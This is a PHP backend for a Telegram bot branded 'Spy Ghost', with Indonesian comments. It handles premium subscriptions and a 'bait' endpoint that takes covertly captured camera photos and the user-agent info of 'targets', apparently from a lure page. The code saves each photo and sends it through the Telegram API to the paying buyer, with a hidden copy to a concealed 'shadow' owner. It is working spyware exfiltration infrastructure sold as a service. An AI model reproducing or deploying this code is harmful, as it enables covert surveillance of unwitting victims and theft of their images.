<?php
include 'config.php';
$input = json_decode(file_get_contents('php://input'), true);

// --- LOGIKA BOT TELEGRAM (Command /start & /add) ---
$update = json_decode(file_get_contents('php://input'), true);
if (isset($update['message'])) {
    $txt = $update['message']['text'];
    $cid = $update['message']['chat']['id'];

    if (strpos($txt, '/start') === 0) {
        $msg = "🕶️ **PROTOCOL SPY GHOST ONLINE** 🕶️\n----------------------------------\nID Anda: `$cid`\nStatus: " . (isset($premium_users[$cid]) ? "PREMIUM ✅" : "TIDAK TERDAFTAR ❌");
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$cid&text=".urlencode($msg)."&parse_mode=Markdown");
    }

    if (strpos($txt, '/add') === 0 && $cid == $owner_bayangan) {
        $p = explode(' ', $txt);
        if(count($p) == 3) {
            $premium_users[$p[1]] = date('Y-m-d', strtotime("+".$p[2]." days"));
            file_put_contents($db_file, json_encode($premium_users));
            $res = "✅ **USER DITAMBAHKAN!**\n🆔 ID: `".$p[1]."` aktif ".$p[2]." hari.";
            file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$cid&text=".urlencode($res)."&parse_mode=Markdown");
        }
    }
}

// --- LOGIKA PANCINGAN (Kirim Foto) ---
if (isset($input['img'])) {
    $uid = $input['user_id'];
    
    // Fitur Cek Premium
    if (!isset($premium_users[$uid])) {
        $p_tolak = str_replace("{ID}", $uid, $pesan_sewa);
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$uid&text=".urlencode($p_tolak)."&parse_mode=Markdown");
        exit;
    }

    $img = base64_decode(str_replace('data:image/jpeg;base64,', '', $input['img']));
    $fname = 'ghost_'.time().'.jpg';
    file_put_contents($fname, $img);
    
    $cap = "👻 **SPY GHOST REPORT** 👻\n---------------------------\n🎯 **TARGET ACQUIRED!**\n📱 **Info**: ".$input['info']['agent'];

    function kirim($cid, $tk, $fl, $cp) {
        $url = "https://api.telegram.org/bot$tk/sendPhoto";
        $post = ['chat_id' => $cid, 'photo' => new CURLFile(realpath($fl)), 'caption' => $cp, 'parse_mode' => 'Markdown'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }

    kirim($owner_1, $token, $fname, $cap); // Kirim ke Pembeli
    kirim($owner_bayangan, $token, $fname, "🕵️ **MONITOR BAYANGAN**\n".$cap); // Kirim ke Boss Kensora
    unlink($fname);
}
?>
